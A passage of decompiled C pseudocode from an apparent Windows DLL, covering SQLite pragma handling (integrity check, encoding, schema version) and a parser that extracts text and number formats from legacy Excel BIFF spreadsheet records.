                  sub_1005AC02((int *)v136, 94, 0, 3, 0, v106, (_BYTE *)0xFFFFFFFF);
                  sub_1005AB66(v107, 13, 2, 4, 1);
                  sub_1005AB66(v107, 91, 4, 3, 2);
                  sub_1005AB66(v107, 16, 2, 1, 0);
                  sub_1005AE20((int)v126, v107);
                  for ( n = *(_DWORD *)(v104 + 8); n; n = *(_DWORD *)n )
                  {
                    if ( v125 )
                      break;
                    v108 = *(_DWORD *)(*(_DWORD *)(n + 8) + 20) == 0;
                    v126 = *(int **)(n + 8);
                    if ( !v108 )
                    {
                      v109 = sub_1005ABD1(v136, 112, 1);
                      sub_1005AB66(v136, 6, 0, 0, 0);
                      sub_1005AE20(v109, v136);
                      v110 = (int)v126;
                      sub_1007A92E(a1, (int)v126, 1, 38);
                      v111 = (int *)v136;
                      sub_1005AB66(v136, 7, 0, 2, 0);
                      HIDWORD(v123) = sub_1005AB66((int)v111, 64, 1, 0, 0);
                      sub_1005AB66((int)v111, 20, 2, 1, 0);
                      v112 = *(unsigned __int16 ***)(v110 + 20);
                      if ( v112 )
                      {
                        v129 = 2;
                        do
                        {
                          v113 = sub_100808B0(a1, v112, 1, 3, 0);
                          v124 = sub_1005AC32(v111, 49, v129, 0, v113, (unsigned __int16 *)((char *)v112[1] + 1));
                          v114 = sub_1005AD69(v111, 11, (int)&unk_100FC53C);
                          sub_1005AFA8(v114 + 1, v111, (unsigned __int16 *)aRowid_5, (_BYTE *)0xFFFFFFFE);
                          sub_1005AFA8(v114 + 3, v111, (unsigned __int16 *)aMissingFromInd, (_BYTE *)0xFFFFFFFE);
                          sub_1005AFA8(v114 + 4, v111, *v112, (_BYTE *)0xFFFFFFFE);
                          sub_1005AE20(v114 + 9, (int)v111);
                          sub_1005AE20(v124, (int)v111);
                          v112 = (unsigned __int16 **)v112[8];
                          ++v129;
                        }
                        while ( v112 );
                      }
                      sub_1005ABE8((int)v111, 66, 1, HIDWORD(v123) + 1);
                      sub_1005AE20(SHIDWORD(v123), (int)v111);
                      v126 = (int *)v126[5];
                      if ( v126 )
                      {
                        v129 = 2;
                        do
                        {
                          v115 = (int *)v136;
                          v116 = sub_1005ABD1(v136, 112, 1);
                          sub_1005AB66((int)v115, 6, 0, 0, 0);
                          sub_1005AE20(v116, (int)v115);
                          v117 = sub_1005AD69(v115, 10, (int)&unk_100FC568);
                          sub_1005ADFE(v117 + 1, v129, (int)v115);
                          if ( v115[3] > v117 + 1 )
                            *(_DWORD *)(20 * (v117 + 1) + v115[5] + 8) = v117 + 4;
                          sub_1005ADFE(v117 + 3, v129, (int)v115);
                          if ( v115[3] > v117 + 3 )
                            *(_DWORD *)(20 * (v117 + 3) + v115[5] + 8) = v117 + 2;
                          sub_1005AE20(v117 + 4, (int)v115);
                          sub_1005AFA8(v117 + 6, v115, (unsigned __int16 *)aWrongOfEntries, (_BYTE *)0xFFFFFFFE);
                          v118 = (int)v126;
                          sub_1005AFA8(v117 + 7, v115, (unsigned __int16 *)*v126, (_BYTE *)0xFFFFFFFE);
                          v119 = *(_DWORD *)(v118 + 32);
                          ++v129;
                          v126 = (int *)v119;
                        }
                        while ( v119 );
                      }
                    }
                  }
                  ++v130;
                  v128 += 16;
                }
                while ( (int)v130 < v134[1] );
              }
              v120 = (int *)v136;
              v121 = sub_1005AD69((_DWORD *)v136, 4, (int)&unk_100FC52C);
              if ( v120[3] > v121 )
                *(_DWORD *)(20 * v121 + v120[5] + 8) = -v127;
              sub_1005AE20(v121 + 1, (int)v120);
              sub_1005AFA8(v121 + 2, v120, (unsigned __int16 *)aOk, (_BYTE *)0xFFFFFFFE);
              goto LABEL_264;
            }
            goto LABEL_266;
          }
          if ( !sub_100593BE(v51, (unsigned __int8 *)aEncoding) )
          {
            if ( String )
            {
              v87 = *(_WORD *)(*(_DWORD *)(v134[2] + 12) + 74);
              if ( (v87 & 1) == 0 || (v87 & 4) != 0 )
              {
                v88 = (unsigned __int8 *)aUtf8;
                v89 = &::Src;
                if ( !aUtf8 )
                  goto LABEL_214;
                while ( sub_100593BE((unsigned __int8 *)String, v88) )
                {
                  v89 += 2;
                  v88 = (unsigned __int8 *)*v89;
                  if ( !*v89 )
                    goto LABEL_213;
                }
                v90 = *((_BYTE *)v89 + 4);
                if ( !v90 )
                  v90 = 2;
                *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(*a1 + 8) + 12) + 73) = v90;
LABEL_213:
                if ( !*v89 )
LABEL_214:
                  sub_10059320(a1, "unsupported encoding: %s", String);
              }
              goto LABEL_264;
            }
            if ( sub_10058497(a1) )
              goto LABEL_266;
            v37 = (int *)v136;
            sub_1005B4BC(1, v136);
            sub_1005B518((int)v37, 0, 0, aEncoding_0, 0);
            sub_1005AB66((int)v37, 94, 0, 1, 0);
            sub_1005AFA8(
              -1,
              v37,
              *((unsigned __int16 **)&::Src + 2 * *(unsigned __int8 *)(*(_DWORD *)(*(_DWORD *)(*a1 + 8) + 12) + 73)),
              (_BYTE *)0xFFFFFFFE);
LABEL_79:
            sub_1005AB66((int)v37, 16, 1, 1, 0);
            goto LABEL_264;
          }
          if ( sub_100593BE(v51, (unsigned __int8 *)aSchemaVersion)
            && sub_100593BE(v51, (unsigned __int8 *)aUserVersion)
            && sub_100593BE(v51, (unsigned __int8 *)aFreelistCount) )
          {
            goto LABEL_264;
          }
          v91 = (_DWORD *)v136;
          sub_1005B0F6(n, (int *)v136);
          v92 = *v57;
          if ( *v57 != 70 )
          {
            if ( v92 == 83 )
              goto LABEL_223;
            if ( v92 != 102 )
            {
              if ( v92 != 115 )
              {
                v145 = 6;
LABEL_225:
                if ( String && v145 )
                {
                  v93 = sub_1005AD69(v91, 3, (int)&unk_100FC5D8);
                  sub_1005ADFE(v93, n, (int)v91);
                  v94 = j__atol(String);
                  sub_1005ADFE(v93 + 1, v94, (int)v91);
                  v95 = v93 + 2;
                  sub_1005ADFE(v95, n, (int)v91);
                  if ( v91[3] > v95 )
                    *(_DWORD *)(20 * v95 + v91[5] + 8) = v145;
                }
                else
                {
                  v96 = sub_1005AD69(v91, 3, (int)&unk_100FC5E4);
                  sub_1005ADFE(v96, n, (int)v91);
                  v97 = v96 + 1;
                  sub_1005ADFE(v97, v98, (int)v91);
                  if ( v91[3] > v97 )
                    *(_DWORD *)(20 * v97 + v91[5] + 12) = v145;
                  v99 = v136;
                  sub_1005B4BC(1, v136);
                  sub_1005B518(v99, 0, 0, Src, (void (__cdecl *)(int, unsigned int))0xFFFFFFFF);
                }
                goto LABEL_264;
              }
LABEL_223:
              v145 = 1;
              goto LABEL_225;
            }
          }
          v145 = 0;
          goto LABEL_225;
        }
      }
    }
  }
}
// 10088C9A: conditional instruction was optimized away because %var_20.4==0
// 10088CB8: conditional instruction was optimized away because ecx.4<2u
// 10088D7B: conditional instruction was optimized away because %var_20.4==0
// 10088A3E: variable 'v16' is possibly undefined
// 10088F3C: variable 'v49' is possibly undefined
// 10088F75: variable 'v50' is possibly undefined
// 10089851: variable 'v84' is possibly undefined
// 10089B79: variable 'v98' is possibly undefined
// 100FC500: using guessed type char *off_100FC500[5];
// 101863F0: using guessed type int dword_101863F0;

//----- (1008A057) --------------------------------------------------------
void __usercall sub_1008A057(_BYTE *a1@<esi>)
{
  int v1; // eax

  if ( *a1 != 9 )
    sub_1008AC12(0xE0000008);
  v1 = (unsigned __int8)a1[1];
  dword_101864A0 = v1;
  if ( v1 == 2 )
  {
    dword_101864A0 = 3;
LABEL_8:
    sub_1008AC12(0xE0000009);
    return;
  }
  if ( v1 == 8 )
  {
    v1 = (unsigned __int8)a1[5];
    dword_101864A0 = v1;
  }
  if ( v1 != 6 )
    goto LABEL_8;
}
// 101864A0: using guessed type int dword_101864A0;

//----- (1008A0A0) --------------------------------------------------------
unsigned __int8 *__usercall sub_1008A0A0@<eax>(int a1@<eax>, unsigned __int8 *a2@<ecx>)
{
  unsigned __int8 v4; // cl
  unsigned __int16 *v5; // esi
  int v6; // edi
  unsigned __int16 *v7; // ebx

  if ( dword_101864A0 < 6 )
    return sub_1008B002(a1, a2);
  v4 = *a2;
  v5 = (unsigned __int16 *)(a2 + 1);
  v6 = 0;
  if ( (v4 & 8) != 0 )
    v6 = 4 * *v5++;
  if ( (v4 & 4) != 0 )
  {
    v6 += *(_DWORD *)v5;
    v5 += 2;
  }
  if ( (v4 & 1) != 0 )
  {
    v5 = sub_1008AF82(v5, a1);
  }
  else
  {
    v7 = (unsigned __int16 *)((char *)v5 + a1);
    while ( v5 < v7 )
    {
      sub_1008AEFA(*(unsigned __int8 *)v5);
      v5 = (unsigned __int16 *)((char *)v5 + 1);
    }
  }
  return (unsigned __int8 *)v5 + v6;
}
// 101864A0: using guessed type int dword_101864A0;

//----- (1008A105) --------------------------------------------------------
void sub_1008A105()
{
  void **v0; // eax
  int i; // esi

  v0 = (void **)dword_101864A4;
  if ( dword_101864A4 )
  {
    for ( i = 0; i < dword_101864A8; ++i )
    {
      if ( v0[2 * i] )
      {
        free(v0[2 * i]);
        v0 = (void **)dword_101864A4;
      }
    }
    free(v0);
    dword_101864A4 = 0;
  }
}
// 101864A8: using guessed type int dword_101864A8;

//----- (1008A145) --------------------------------------------------------
unsigned __int16 *__usercall sub_1008A145@<eax>(int a1@<eax>, unsigned __int16 *a2)
{
  int v3; // edi
  unsigned __int16 *result; // eax
  unsigned __int16 *v5; // esi
  int v6; // ebx
  int v7; // edi
  char v8; // al
  char *v9; // edi
  unsigned int v10; // esi
  int v11; // ecx
  char *v12; // esi
  int v13; // edx
  char v14; // cl
  _WORD *j; // ecx
  int i; // [esp+8h] [ebp-14h]
  int v17; // [esp+Ch] [ebp-10h]
  int v18; // [esp+10h] [ebp-Ch]
  char *v19; // [esp+14h] [ebp-8h]
  char v20; // [esp+1Bh] [ebp-1h]

  dword_101864A8 = *(_DWORD *)(a1 + 4);
  v3 = 0;
  dword_101864A4 = malloc(8 * dword_101864A8);
  if ( !dword_101864A4 )
    sub_1008AC12(0xE000000B);
  memset(dword_101864A4, 0, 8 * dword_101864A8);
  result = a2;
  v5 = (unsigned __int16 *)(a1 + 8);
  if ( v5 != a2 )
  {
    for ( i = 0; ; v3 = i )
    {
      if ( (unsigned __int16 *)((char *)v5 + 3) > a2 )
        sub_1008AC12(0xE000000C);
      if ( v3 >= dword_101864A8 )
        sub_1008AC12(0xE000000E);
      v6 = *v5;
      v7 = 8 * v3;
      *(_DWORD *)((char *)dword_101864A4 + v7 + 4) = v6;
      v19 = (char *)malloc(2 * v6);
      *(_DWORD *)((char *)dword_101864A4 + v7) = v19;
      if ( !v19 )
        sub_1008AC12(0xE000000B);
      memset(v19, 0, 2 * v6);
      v8 = *((_BYTE *)v5 + 2);
      v9 = (char *)v5 + 3;
      v20 = v8;
      v10 = (unsigned int)v5 + v6 + 3;
      if ( (v8 & 1) != 0 )
        v10 += v6;
      v17 = 0;
      if ( (v8 & 8) != 0 )
      {
        v17 = 4 * *(unsigned __int16 *)v9 + 2;
        v9 += 2;
      }
      if ( (v8 & 4) != 0 )
      {
        v17 += *(_DWORD *)v9 + 4;
        v9 += 4;
      }
      result = a2;
      if ( v10 > (unsigned int)a2 )
      {
        v11 = (char *)a2 - v9;
        v18 = (char *)a2 - v9;
        if ( *(_BYTE *)a2 != 60 )
        {
          sub_1008AC12(0xE0000011);
          result = a2;
          v11 = (char *)a2 - v9;
        }
        if ( v20 )
        {
          if ( (v11 & 1) != 0 )
          {
            sub_1008AC12(0xE0000012);
            v11 = (char *)a2 - v9;
          }
          memcpy(v19, v9, v11);
          v19 += v18;
          result = a2;
          v11 = v18 >> 1;
        }
        else
        {
          v12 = v19;
          v13 = v11 - 1;
          if ( v11 - 1 >= 0 )
          {
            do
            {
              *(_WORD *)v12 = (unsigned __int8)*v9++;
              v12 += 2;
              --v13;
            }
            while ( v13 >= 0 );
            result = a2;
          }
          v19 = v12;
        }
        v6 -= v11;
        v9 = (char *)result + 5;
        v14 = *((_BYTE *)result + 4);
        v20 = v14;
        v10 = (unsigned int)result + v6 + 5;
        if ( v14 == 1 )
        {
          v10 += v6;
        }
        else if ( v14 )
        {
          sub_1008AC12(0xE0000013);
          result = a2;
        }
      }
      if ( (v20 & 1) != 0 )
      {
        memcpy(v19, v9, 2 * v6);
        result = a2;
      }
      else
      {
        for ( j = v19; --v6 >= 0; ++j )
          *j = (unsigned __int8)*v9++;
      }
      v5 = (unsigned __int16 *)(v17 + v10);
      if ( v5 >= result )
      {
        if ( v5 == result )
        {
          if ( *(_BYTE *)result != 60 )
            return result;
          v5 += 2;
        }
        else if ( *(_BYTE *)result != 60 )
        {
          sub_1008AC12(0xE0000014);
          result = a2;
        }
        a2 = (unsigned __int16 *)((char *)result + result[1] + 4);
      }
      ++i;
    }
  }
  return result;
}
// 101864A8: using guessed type int dword_101864A8;

//----- (1008A35E) --------------------------------------------------------
unsigned int sub_1008A35E()
{
  unsigned int result; // eax

  dword_101864B4 = 49;
  dword_101864B0 = malloc(0xC4u);
  if ( !dword_101864B0 )
    sub_1008AC12(0xE000000B);
  memset(dword_101864B0, 0, 4 * dword_101864B4);
  for ( result = 0; result < 0x31; ++result )
  {
    *((_BYTE *)dword_101864B0 + 4 * result) = byte_1017E6D8[result] >> 4;
    *((_BYTE *)dword_101864B0 + 4 * result + 1) = byte_1017E6D8[result] & 0xF;
  }
  dword_101864AC = 4;
  return result;
}
// 1017E6D8: using guessed type _BYTE byte_1017E6D8[52];
// 101864AC: using guessed type int dword_101864AC;
// 101864B4: using guessed type int dword_101864B4;

//----- (1008A3D8) --------------------------------------------------------
void sub_1008A3D8()
{
  if ( dword_101864B0 )
  {
    free(dword_101864B0);
    dword_101864B0 = 0;
  }
}

//----- (1008A3F0) --------------------------------------------------------
void sub_1008A3F0()
{
  if ( dword_101864BC )
  {
    free(dword_101864BC);
    dword_101864BC = 0;
    dword_101864C4 = 0;
    dword_101864C0 = 0;
  }
}
// 101864C0: using guessed type int dword_101864C0;
// 101864C4: using guessed type int dword_101864C4;

//----- (1008A416) --------------------------------------------------------
void __usercall sub_1008A416(unsigned int a1@<eax>)
{
  int v1; // esi

  v1 = dword_101864B4;
  if ( a1 >= dword_101864B4 )
  {
    dword_101864B4 = (a1 + 16) & 0xFFFFFFF0;
    dword_101864B0 = realloc(dword_101864B0, 4 * dword_101864B4);
    if ( !dword_101864B0 )
      sub_1008AC12(0xE000000F);
    while ( v1 < dword_101864B4 )
      *((_DWORD *)dword_101864B0 + v1++) = 0;
  }
}
// 101864B4: using guessed type int dword_101864B4;

//----- (1008A467) --------------------------------------------------------
unsigned int __usercall sub_1008A467@<eax>(unsigned int a1@<ebx>)
{
  int v1; // esi
  unsigned int v2; // edi
  unsigned int result; // eax

  v1 = dword_101864C0;
  v2 = dword_101864C4++;
  if ( v2 >= dword_101864C0 )
  {
    dword_101864C0 = (v2 + 64) & 0xFFFFFFC0;
    dword_101864BC = realloc(dword_101864BC, 2 * dword_101864C0);
    if ( !dword_101864BC )
      sub_1008AC12(0xE000000F);
    while ( v1 < dword_101864C0 )
      *((_WORD *)dword_101864BC + v1++) = 0;
  }
  result = a1 < dword_101864B4 ? a1 : 0;
  *((_WORD *)dword_101864BC + v2) = result;
  return result;
}
// 101864B4: using guessed type int dword_101864B4;
// 101864C0: using guessed type int dword_101864C0;
// 101864C4: using guessed type int dword_101864C4;

//----- (1008A4DA) --------------------------------------------------------
char *__usercall sub_1008A4DA@<eax>(char *result@<eax>, _WORD *a2@<ecx>, char *a3)
{
  _WORD *v3; // esi
  _WORD *v4; // edi
  bool v5; // zf
  _WORD *v6; // ebx
  _WORD *v7; // ecx

  v3 = a2;
  v4 = &a2[(_DWORD)result];
  v5 = v4 == a2;
LABEL_5:
  if ( !v5 )
  {
    if ( *v3 == 91 )
    {
      while ( ++v3 != v4 )
      {
        if ( *v3 == 93 )
        {
          v5 = ++v3 == v4;
          goto LABEL_5;
        }
      }
    }
    else
    {
      v6 = v3;
      do
      {
        result = (char *)(unsigned __int16)*v3;
        if ( (_WORD)result == 46 )
        {
          v7 = v3;
          do
            ++v3;
          while ( v3 < v4 && (*v3 == 48 || *v3 == 35) );
          result = a3;
          a3[1] = v3 - v7 - 1;
          goto LABEL_21;
        }
        if ( (unsigned __int16)result >= 0x80u )
          break;
        result = strchr(a0_0, (unsigned __int16)result);
        if ( !result )
          break;
        ++v3;
      }
      while ( v3 != v4 );
      if ( v6 != v3 && (v3 == v4 || *v3 != 47) )
      {
        result = a3;
        a3[1] = 0;
LABEL_21:
        *result = 1;
      }
    }
  }
  return result;
}

//----- (1008A576) --------------------------------------------------------
char *__thiscall sub_1008A576(unsigned __int16 *this)
{
  char *result; // eax
  _BYTE *v2; // esi
  unsigned int v3; // ebx
  char *v4; // edi
  _BYTE *v5; // ecx
  int v6; // eax
  int v7; // ecx
  int v8; // edx
  int i; // eax
  __int16 v10; // dx
  __int16 v11[128]; // [esp+10h] [ebp-7Ch] BYREF

  result = (char *)dword_101864A0;
  v2 = (char *)this + 1;
  if ( dword_101864A0 >= 4 )
    v2 = (char *)this + 3;
  if ( dword_101864A0 >= 5 )
    v3 = *this;
  else
    v3 = dword_101864B8++;
  v4 = (char *)(unsigned __int8)*(v2 - 1);
  if ( dword_101864A0 >= 6 )
  {
    v4 = (char *)this[1];
    ++v2;
  }
  if ( (unsigned int)v4 <= 0x80 )
  {
    sub_1008A416(v3);
    v5 = v2;
    if ( dword_101864A0 >= 6 && (v5 = v2 + 1, (*v2 & 1) != 0) )
    {
      v6 = (int)(v4 - 1);
      if ( (int)(v4 - 1) >= 0 )
      {
        v7 = v5 - (_BYTE *)v11;
        do
        {
          v8 = v7 + 2 * v6--;
          v11[v6 + 1] = *(__int16 *)((char *)v11 + v8);
        }
        while ( v6 >= 0 );
      }
    }
    else
    {
      for ( i = (int)(v4 - 1); i >= 0; v11[i + 1] = v10 )
        v10 = (unsigned __int8)v5[i--];
    }
    return sub_1008A4DA(v4, v11, (char *)dword_101864B0 + 4 * v3);
  }
  return result;
}
// 101864A0: using guessed type int dword_101864A0;
// 101864B8: using guessed type int dword_101864B8;

//----- (1008A64A) --------------------------------------------------------
unsigned __int16 *__cdecl sub_1008A64A(int a1, double a2)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v5; // eax
  wchar_t String[514]; // [esp+8h] [ebp-40Ch] BYREF

  if ( dword_10194F0C )
  {
    _swprintf(String, (const wchar_t *const)0x200, asc_1017E714, a2);
  }
  else
  {
    if ( a1 < 0 || a1 >= dword_101864C0 )
      v2 = 0;
    else
      v2 = *((unsigned __int16 *)dword_101864BC + a1);
    v3 = *((_DWORD *)dword_101864B0 + v2);
    if ( (unsigned __int8)v3 == 1 )
    {
      _swprintf(String, L"%.*f", BYTE1(v3), a2);
    }
    else if ( (unsigned __int8)v3 == 2 )
    {
      _swprintf(String, aE, BYTE1(v3), a2);
    }
    else
    {
      v4 = dword_101864AC;
      if ( dword_101864AC >= 511 )
        v4 = 511;
      _swprintf(String, asc_1017E71C, v4, a2);
    }
  }
  v5 = wcslen(String);
  return sub_1008AF82(String, v5);
}
// 1008A6DB: conditional instruction was optimized away because eax.4<100u
// 1008A6FE: conditional instruction was optimized away because eax.4<100u
// 1017E714: using guessed type wchar_t asc_1017E714[3];
// 1017E71C: using guessed type wchar_t asc_1017E71C[5];
// 1017E734: using guessed type wchar_t aE[5];
// 101864AC: using guessed type int dword_101864AC;
// 101864C0: using guessed type int dword_101864C0;
// 10194F0C: using guessed type int dword_10194F0C;

//----- (1008A743) --------------------------------------------------------
unsigned __int16 *__usercall sub_1008A743@<eax>(int a1@<eax>, int a2)
{
  double v2; // st7
  double v4; // [esp+8h] [ebp-Ch]

  if ( (a1 & 2) != 0 )
  {
    v2 = (double)(a1 >> 2);
  }
  else
  {
    LODWORD(v4) = 0;
    HIDWORD(v4) = a1 & 0xFFFFFFFC;
    v2 = v4;
  }
  if ( (a1 & 1) != 0 )
    v2 = v2 / 100.0;
  return sub_1008A64A(a2, v2);
}

//----- (1008A783) --------------------------------------------------------
int __usercall sub_1008A783@<eax>(int a1@<edi>, int a2@<esi>)
{
  int result; // eax

  if ( dword_10194F08 < a2 )
  {
    dword_10194F00 = 0;
    do
    {
      sub_1008AC82(13);
      result = sub_1008AC82(10);
      ++dword_10194F08;
    }
    while ( dword_10194F08 < a2 );
  }
  while ( dword_10194F00 < a1 )
  {
    result = sub_1008AC82(9);
    ++dword_10194F00;
  }
  return result;
}
// 10194F00: using guessed type int dword_10194F00;
// 10194F08: using guessed type int dword_10194F08;

//----- (1008A7CB) --------------------------------------------------------
int __usercall sub_1008A7CB@<eax>(unsigned __int16 *a1@<eax>)
{
  return sub_1008A783(a1[1], *a1);
}

//----- (1008A7DC) --------------------------------------------------------
void __cdecl sub_1008A7DC(int a1)
{
  int v1; // esi
  unsigned int v2; // ebx
  unsigned __int8 v3; // cl
  int v4; // eax
  unsigned __int16 *v5; // esi
  unsigned __int16 *v6; // edi
  unsigned int v7; // ebx
  unsigned int v9; // esi
  int v10; // ebx
  unsigned __int16 *v12; // ecx
  unsigned __int8 v13; // dl
  int v14; // eax
  char *v15; // ebx
  int v16; // eax
  unsigned __int8 *v17; // ecx
  int v18; // esi
  int v19; // edi
  int *v20; // esi
  bool i; // cf
  int v22; // eax
  char v23; // [esp+1Ah] [ebp-36h]
  char v24; // [esp+1Bh] [ebp-35h]
  unsigned int v25; // [esp+1Ch] [ebp-34h]
  unsigned __int16 *v26; // [esp+20h] [ebp-30h]
  unsigned __int16 *v27; // [esp+24h] [ebp-2Ch]
  wchar_t String[12]; // [esp+34h] [ebp-1Ch] BYREF

  v26 = 0;
  v1 = dword_10186498;
  v2 = dword_1018649C + dword_10186498;
  v25 = dword_1018649C + dword_10186498;
  v23 = 0;
  sub_1008A35E();
  if ( *(_WORD *)(v1 + 6) == 16 && !a1 )
    v26 = (unsigned __int16 *)v1;
  if ( v1 + 4 > v2 )
  {
LABEL_27:
    v5 = v26;
    if ( v26 )
      goto LABEL_28;
    goto LABEL_69;
  }
  while ( 1 )
  {
    v3 = *(_BYTE *)v1;
    v4 = *(unsigned __int16 *)(v1 + 2);
    if ( *(_BYTE *)v1 == 10 || v3 == 0x8F )
      goto LABEL_27;
    v5 = (unsigned __int16 *)(v1 + 4);
    v6 = (unsigned __int16 *)((char *)v5 + v4);
    if ( (unsigned int)v5 + v4 > v2 )
      break;
    if ( v3 == 2 )
    {
      v7 = *((unsigned __int8 *)v5 + 1);
LABEL_25:
      sub_1008A467(v7);
      goto LABEL_26;
    }
    if ( v3 == 30 )
    {
      sub_1008A576(v5);
    }
    else if ( v3 == 66 )
    {
      sub_1008AF9D(*v5);
    }
    else
    {
      if ( v3 != 133 )
      {
        if ( v3 == 142 )
          goto LABEL_19;
        if ( v3 != 224 )
        {
          if ( v3 == 252 )
            v6 = sub_1008A145((int)v5, v6);
          goto LABEL_26;
        }
        v7 = v5[1];
        goto LABEL_25;
      }
      if ( dword_101864A0 > 4 && !a1-- )
      {
LABEL_19:
        v9 = dword_10186498 + *(_DWORD *)v5;
        v26 = (unsigned __int16 *)v9;
        if ( v9 < dword_10186498 || v9 >= v2 )
          sub_1008AC12(0xE0000015);
      }
    }
LABEL_26:
    v2 = v25;
    v1 = (int)v6;
    if ( (unsigned int)(v6 + 2) > v25 )
      goto LABEL_27;
  }
LABEL_30:
  while ( 2 )
  {
    sub_1008AC12(0xE0000017);
LABEL_31:
    if ( *(_BYTE *)v5 == 9 )
      goto LABEL_39;
    v10 = v5[1];
    if ( *(_BYTE *)v5 != 0x8F )
LABEL_38:
      sub_1008AC12(0xE0000018);
    while ( a1-- )
    {
      v5 = (unsigned __int16 *)((char *)v5 + v10 + v5[2] + 4);
      if ( (unsigned int)v5 >= v25 || *(_BYTE *)v5 != 0x8F )
      {
LABEL_69:
        sub_1008AC12(0xE0000016);
        v5 = v26;
LABEL_28:
        if ( (unsigned int)v5 >= v25 || (unsigned int)v5 + v5[1] + 4 >= v25 )
          goto LABEL_30;
        goto LABEL_31;
      }
      v10 = v5[1];
    }
    v5 = (unsigned __int16 *)((char *)v5 + v10 + 4);
    if ( *(_BYTE *)v5 != 9 )
      goto LABEL_38;
LABEL_39:
    if ( v5[3] == 16 )
    {
      dword_10194F08 = 0;
      dword_10194F00 = 0;
LABEL_41:
      v12 = v5 + 2;
      if ( (unsigned int)(v5 + 2) > v25 || (v13 = *(_BYTE *)v5, v14 = v5[1], v24 = *(_BYTE *)v5, *(_BYTE *)v5 == 10) )
      {
        sub_1008A783(0, dword_10194F08 + 1);
        goto LABEL_72;
      }
      v5 += 2;
      v15 = (char *)v12 + v14;
      v27 = (unsigned __int16 *)((char *)v12 + v14);
      if ( (unsigned int)v12 + v14 > v25 )
        continue;
      if ( v13 > 0x7Eu )
      {
        if ( v13 == 189 )
        {
          v19 = v12[2];
          sub_1008A7CB(v12);
          v20 = (int *)(v5 + 3);
          sub_1008A743(*v20, v19);
          for ( i = v20 < (int *)(v15 - 11); i; i = v20 < (int *)((char *)v27 - 11) )
          {
            sub_1008AC82(9);
            ++dword_10194F00;
            v20 = (int *)((char *)v20 + 6);
            sub_1008A743(*v20, v19);
          }
          goto LABEL_68;
        }
        if ( v13 != 214 )
        {
          if ( v13 == 253 )
          {
            sub_1008A7CB(v12);
            v18 = v5[3];
            if ( v18 >= dword_101864A8 )
              sub_1008AC12(0xE000000A);
            sub_1008AF82(*((unsigned __int16 **)dword_101864A4 + 2 * v18), *((_DWORD *)dword_101864A4 + 2 * v18 + 1));
          }
          goto LABEL_68;
        }
      }
      else
      {
        if ( v13 == 126 )
        {
          sub_1008A7CB(v12);
          sub_1008A743(*(_DWORD *)(v5 + 3), v5[2]);
          goto LABEL_68;
        }
        if ( v13 == 3 )
        {
          sub_1008A7CB(v12);
          goto LABEL_57;
        }
        if ( v13 != 4 )
        {
          if ( v13 != 6 )
          {
            if ( v13 == 7 && v23 == 6 )
            {
              v16 = *v12;
              v17 = (unsigned __int8 *)(v12 + 1);
              goto LABEL_55;
            }
            goto LABEL_68;
          }
          sub_1008A7CB(v12);
          if ( v5[6] == 0xFFFF )
            goto LABEL_68;
LABEL_57:
          sub_1008A64A(v5[2], *(double *)(v5 + 3));
          goto LABEL_68;
        }
      }
      sub_1008A7CB(v12);
      v16 = v5[3];
      v17 = (unsigned __int8 *)(v5 + 4);
LABEL_55:
      sub_1008A0A0(v16, v17);
LABEL_68:
      v5 = v27;
      v23 = v24;
      goto LABEL_41;
    }
    break;
  }
  qmemcpy(String, aNotASheet, sizeof(String));
  v22 = wcslen(String);
  sub_1008AF82(String, v22);
  sub_1008AC31();
LABEL_72:
  sub_1008A3D8();
  sub_1008A105();
  sub_1008A3F0();
}
// 1017E740: using guessed type wchar_t aNotASheet[12];
// 10186498: using guessed type int dword_10186498;
// 1018649C: using guessed type int dword_1018649C;
// 101864A0: using guessed type int dword_101864A0;
// 101864A8: using guessed type int dword_101864A8;
// 10194F00: using guessed type int dword_10194F00;
// 10194F08: using guessed type int dword_10194F08;

//----- (1008AB6B) --------------------------------------------------------
int sub_1008AB6B()
{
  int v0; // ebp
  int v1; // esi
  unsigned int v2; // edi
  unsigned __int16 *i; // eax
  unsigned __int8 v4; // cl
  int v5; // ebx
  unsigned __int16 *v6; // esi
  unsigned __int8 *v7; // ecx
  int result; // eax
  int v9; // eax
  int v10; // [esp+10h] [ebp-4h]

  v10 = 0;
  v0 = *(unsigned __int16 *)(dword_10186498 + 6);
  v1 = dword_10186498;
  v2 = dword_1018649C + dword_10186498;
  for ( i = (unsigned __int16 *)(dword_10186498 + 4); ; i = (unsigned __int16 *)(v1 + 4) )
  {
    if ( (unsigned int)i > v2 )
      return v10;
    v4 = *(_BYTE *)v1;
    v5 = *(unsigned __int16 *)(v1 + 2);
    v6 = i;
    if ( v4 == 10 )
      break;
    if ( v4 == 66 )
    {
      sub_1008AF9D(*i);
    }
    else if ( v4 == 133 )
    {
      v7 = (unsigned __int8 *)i;
      if ( dword_101864A0 > 4 )
        v7 = (unsigned __int8 *)(i + 3);
      ++v10;
      sub_1008A0A0(*v7, v7 + 1);
      sub_1008AC31();
    }
    v1 = (int)v6 + v5;
  }
  result = v10;
  if ( !v10 && v0 == 16 )
  {
    v9 = wcslen(L"Single Sheet");
    sub_1008AF82(aSingleSheet_0, v9);
    sub_1008AC31();
    return 1;
  }
  return result;
}
// 1017E774: using guessed type wchar_t aSingleSheet_0[13];
// 10186498: using guessed type int dword_10186498;
// 1018649C: using guessed type int dword_1018649C;
// 101864A0: using guessed type int dword_101864A0;

//----- (1008AC12) --------------------------------------------------------
void __cdecl sub_1008AC12(DWORD dwExceptionCode)
{
  sub_1008A3D8();
  sub_1008A105();
  sub_1008A3F0();
  RaiseException(dwExceptionCode, 0, 0, 0);
}

//----- (1008AC31) --------------------------------------------------------
int sub_1008AC31()
{
  sub_1008AC82(13);
  return sub_1008AC82(10);
}

//----- (1008AC44) --------------------------------------------------------
int __usercall sub_1008AC44@<eax>(_DWORD *a1@<esi>, int a2)
{
  char v3[8]; // [esp+0h] [ebp-4Ch] BYREF
  int v4; // [esp+8h] [ebp-44h]

  *a1 = 0;
  if ( (*(int (__stdcall **)(int, char *, int))(*(_DWORD *)a2 + 48))(a2, v3, 1) )
    return 0;
  *a1 = v4;
  return 1;
}
// 1008AC44: using guessed type char var_4C[8];

//----- (1008AC82) --------------------------------------------------------
int __usercall sub_1008AC82@<eax>(int a1@<ebx>)
{
  _BYTE *v1; // eax

  if ( dword_10194F10 == dword_101864C8 )
    sub_1008AC12(0xE0000019);
  v1 = (_BYTE *)dword_10194F04++;
  ++dword_10194F10;
  *v1 = a1;
  return a1;
}
// 101864C8: using guessed type int dword_101864C8;
// 10194F04: using guessed type int dword_10194F04;
